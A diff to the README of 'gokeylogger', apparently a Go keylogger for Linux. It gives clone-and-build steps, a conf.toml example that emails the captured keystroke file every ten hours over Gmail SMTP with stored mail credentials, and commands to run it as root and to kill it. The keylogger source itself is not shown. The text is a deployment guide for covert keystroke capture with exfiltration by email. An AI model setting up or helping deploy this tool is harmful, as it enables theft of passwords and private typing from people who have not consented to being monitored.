@@ -1,8 +1,10 @@
-# keylogger golang
-```
-# install:
+# gokeylogger for linux os 
+```sh
+# install :
 $ git clone github.com/mehrati/gokeylogger
 $ cd gokeylogger/
+```
+```toml
 # edit conf.toml with nano or vim or ..
 -----------------------conf.toml example------------------------------
 cron_duration = "@every 10h" # send mail keylog file every 10 hour
@@ -14,10 +16,12 @@ host_mail = "smtp.gmail.com" # host mail
 pass_mail = "*****" # password mail
 port_mail = 587 # port mail
 ---------------------------------------------------------------------
+```
+```sh
 $ go get -d ./...
 $ go build
-# run : 
+# run gokeylogger need root privilege : 
 $ sudo ./gokeylogger
-# kill :
+# kill gokeylogger :
 $ ./kill.sh
 ```
